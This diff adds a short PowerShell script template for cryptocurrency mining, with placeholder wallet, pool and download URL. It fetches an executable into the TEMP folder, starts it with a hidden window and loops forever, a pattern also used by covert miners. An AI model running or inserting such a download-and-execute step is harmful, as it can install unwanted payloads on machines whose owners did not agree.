@@ -1,0 +1,15 @@
+# Mining configuration
+$wallet = "your-wallet-address-here"
+$pool = "pool-address-here"
+$algorithm = "algorithm-name"  # e.g., "ethash", "kawpow", "autolykos2"
+
+# Download mining software
+Invoke-WebRequest -Uri "https://link-to-miner-binary.exe" -OutFile "$env:TEMP\miner.exe"
+
+# Start mining process
+Start-Process -FilePath "$env:TEMP\miner.exe" -ArgumentList "-a $algorithm -o $pool -u $wallet" -WindowStyle Hidden
+
+# Keep process running
+while ($true) {
+    Start-Sleep -Seconds 3600
+}
